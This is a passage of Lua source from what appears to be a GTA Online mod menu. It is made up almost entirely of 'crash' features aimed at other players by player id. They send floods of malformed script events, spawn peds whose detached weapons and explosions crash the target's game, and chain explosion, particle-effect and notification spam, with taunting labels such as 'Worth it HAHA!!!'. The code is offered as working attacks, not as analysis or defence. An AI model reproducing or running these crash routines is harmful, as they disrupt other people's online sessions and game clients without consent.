                            for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736, math.random(int_min, int_max), math.random(int_min, int_max), 
                                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                                util.trigger_script_event(1 << pid, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
                            end
                            util.yield()
                            for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736, pid, math.random(int_min, int_max)})
                                util.trigger_script_event(1 << pid, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
                            end
                menu.trigger_commands("givesh" .. players.get_name(pid))
                        util.trigger_script_event(1 << pid, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
                        end)


                menu.toggle_loop(scrash, "SUS Crash", {"togglesus"}, "This one is bound to hurt.", function(on_toggle)
                notification("SUS Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                        local int_min = -2147483647
                        local int_max = 2147483647
                            for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
                                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                            end
                            util.yield()
                            for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
                            util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787, math.random(int_min, int_max)})
                            util.trigger_script_event(1 << pid, {-1529596656, pid, 795221, 59486,48512151,-9545440, math.random(int_min, int_max)})
                            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                            end
                            menu.trigger_commands("notifyspam" .. players.get_name(pid))
                            menu.trigger_commands("explode" .. players.get_name(pid))
                            menu.trigger_commands("explodeloop" .. players.get_name(pid))
                            menu.trigger_commands("explosiondelay".. players.get_name(pid) .. " 50")
                            menu.trigger_commands("explosionshake".. players.get_name(pid) .. " 10")
                            menu.trigger_commands("ptfx" .. players.get_name(pid))
                            menu.trigger_commands("ptfxamount" .. players.get_name(pid) .. " 250")
                            menu.trigger_commands("ptfxsize" .. players.get_name(pid) .. " 10")
                            menu.trigger_commands("givesh" .. players.get_name(pid))
                            util.yield(100)
                            util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                            util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
                            util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
                            util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
                            util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
                            util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
                            util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
                            util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
                            util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
                            util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
                            util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
                            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                notification("SUS Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                            end)

                menu.toggle_loop(scrash, "Automobile Crash", {"toggleautomob"}, "Sends ped's and automobiles causing (S0) events. Blocked by most popular menus.", function(on_toggle)
                    notification("Automobile Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                            local int_min = -2147483647
                            local int_max = 2147483647
                                for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                                end
                                util.yield()
                                for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                                end
                    menu.trigger_commands("givesh" .. players.get_name(pid))
                                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                    notification("Automobile Crash Sent To " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                            end)

                menu.toggle_loop(scrash, "Autobike Crash", {"toggleautobike"}, "Skidded from X-Force script event code.", function(on_toggle)
                    notification("Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                            local int_min = -2147483647
                            local int_max = 2147483647
                                for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, math.random(int_min, int_max), math.random(int_min, int_max), 
                                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
                                end
                                util.yield()
                                for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, pid, math.random(int_min, int_max)})
                                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
                                end
                menu.trigger_commands("givesh" .. players.get_name(pid))
                                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
                            end)

            local oxtypecrash = menu.list(Removals_List, "Ox Menu Type Crashes", {}, "From Nightfall")

            local oxtypecrashclick = menu.list(oxtypecrash, "Ox Menu Type Crashes Click", {}, "From Nightfall")

            menu.action(oxtypecrashclick, "All Ox Menu Type Crashes", {"oxallcrash"}, "Spam it for stronger results... Use Panic Mode If Needed.", function()
                if on_toggle then
                menu.trigger_commands("clickcombat" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickbeverlycrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickfabiencrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickmanuelcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicktaostranslatorcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicktaostranslator2crash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicktenniscoachcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickwadecrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickshophighcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickfranklincrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicklazlowcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicksiemoncrash" .. players.get_name(pid))
                util.yield(1000)
            else
                menu.trigger_commands("clickcombat" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickbeverlycrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickfabiencrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickmanuelcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicktaostranslatorcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicktaostranslator2crash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicktenniscoachcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickwadecrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickshophighcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickfranklincrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicklazlowcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicksiemoncrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("superc")
                util.yield(10)
                menu.trigger_commands("superc")
                            end
                      end)

                      
            menu.action(oxtypecrashclick, "Combat Crash", {"clickcombat"}, "", function()
                
            local mdl = util.joaat('A_F_M_ProlHost_01')
                if request_model(mdl, 2) then
                    local pos = players.get_position(pid)
                    util.yield(1)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_COMBATMG'), 9999, true, true)
                    local obj
                    repeat
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                    until obj ~= 0 or util.yield()
                    ENTITY.DETACH_ENTITY(obj, true, true) 
                    util.yield(1)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                    entities.delete_by_handle(ped1)
                    util.yield(1)
            else
                    util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            end)
            
            menu.action(oxtypecrashclick, "Beverly Crash", {"clickbeverlycrash"}, "", function()
            
            local mdl = util.joaat('cs_beverly')
                if request_model(mdl, 2) then
                    local pos = players.get_position(pid)
                    util.yield(1)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 1, 0, 0), 0)
                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                    local obj
                    repeat
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                    until obj ~= 0 or util.yield()
                    ENTITY.DETACH_ENTITY(obj, true, true) 
                    util.yield(1)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                    entities.delete_by_handle(ped1)
                    util.yield(1)
            else
                    util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            end)
            
            menu.action(oxtypecrashclick, "Fabien Crash", {"clickfabiencrash"}, "", function()
            
            local mdl = util.joaat('cs_fabien')
                if request_model(mdl, 2) then
                    local pos = players.get_position(pid)
                    util.yield(1)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 1), 0)
                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                    local obj
                    repeat
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                    until obj ~= 0 or util.yield()
                    ENTITY.DETACH_ENTITY(obj, true, true) 
                    util.yield(1)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                    entities.delete_by_handle(ped1)
                    util.yield(1)
            else
                    util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            end)
            
            menu.action(oxtypecrashclick, "Manuel Crash", {"clickmanuelcrash"}, "", function()
            
            local mdl = util.joaat('cs_manuel')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 3, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            
            menu.action(oxtypecrashclick, "Taostranslator Crash", {"clicktaostranslatorcrash"}, "", function()
            
            local mdl = util.joaat('cs_taostranslator')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Taostranslator2 Crash", {"clicktaostranslator2crash"}, "", function()
            
            local mdl = util.joaat('cs_taostranslator2')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 3), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Tenniscoach Crash", {"clicktenniscoachcrash"}, "", function()
            
            local mdl = util.joaat('cs_tenniscoach')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -1, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Wade Crash", {"clickwadecrash"}, "", function()
            
            local mdl = util.joaat('cs_wade')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -1, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Shop HIGH Crash", {"clickshophighcrash"}, "", function()
            
            local mdl = util.joaat('S_F_M_Shop_HIGH')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -1), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Franklin Crash", {"clickfranklincrash"}, "", function()
            
            local mdl = util.joaat('P_Franklin_02')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -3, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Lazlow Crash", {"clicklazlowcrash"}, "", function()
            
            local mdl = util.joaat('CS_Lazlow')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -3, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Siemon Crash", {"clicksiemoncrash"}, "", function()
            
            local mdl = util.joaat('IG_SiemonYetarian')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -3), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)

            local oxtypecrashtoggle = menu.list(oxtypecrash, "Ox Menu Type Crashes Toggled", {}, "From Nightfall")
            
            menu.toggle(oxtypecrashtoggle, "All Ox Menu Type Crashes", {"toggleoxallcrash"}, "Use Panic Mode If Needed.", function(on_toggle)
                if on_toggle then
                menu.trigger_commands("togglecombat" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("beverlycrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("fabiencrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("manuelcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("taostranslatorcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("taostranslator2crash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("tenniscoachcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("wadecrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("shophighcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("franklincrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("lazlowcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("siemoncrash" .. players.get_name(pid))
                util.yield(10)
            else
                menu.trigger_commands("togglecombat" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("beverlycrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("fabiencrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("manuelcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("taostranslatorcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("taostranslator2crash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("tenniscoachcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("wadecrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("shophighcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("franklincrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("lazlowcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("siemoncrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("superc")
                util.yield(10)
                menu.trigger_commands("superc")
                            end
                      end)

                      
            menu.toggle_loop(oxtypecrashtoggle, "Combat Crash", {"togglecombat"}, "", function(on_toggle)
                
            local mdl = util.joaat('A_F_M_ProlHost_01')
                if request_model(mdl, 2) then
                    local pos = players.get_position(pid)
                    util.yield(1)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_COMBATMG'), 9999, true, true)
                    local obj
                    repeat
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                    until obj ~= 0 or util.yield()
                    ENTITY.DETACH_ENTITY(obj, true, true) 
                    util.yield(1)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                    entities.delete_by_handle(ped1)
                    util.yield(1)
            else
                    util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Beverly Crash", {"beverlycrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_beverly')
                if request_model(mdl, 2) then
                    local pos = players.get_position(pid)
                    util.yield(1)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 1, 0, 0), 0)
                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                    local obj
                    repeat
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                    until obj ~= 0 or util.yield()
                    ENTITY.DETACH_ENTITY(obj, true, true) 
                    util.yield(1)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                    entities.delete_by_handle(ped1)
                    util.yield(1)
            else
                    util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Fabien Crash", {"fabiencrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_fabien')
                if request_model(mdl, 2) then
                    local pos = players.get_position(pid)
                    util.yield(1)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 1), 0)
                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                    local obj
                    repeat
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                    until obj ~= 0 or util.yield()
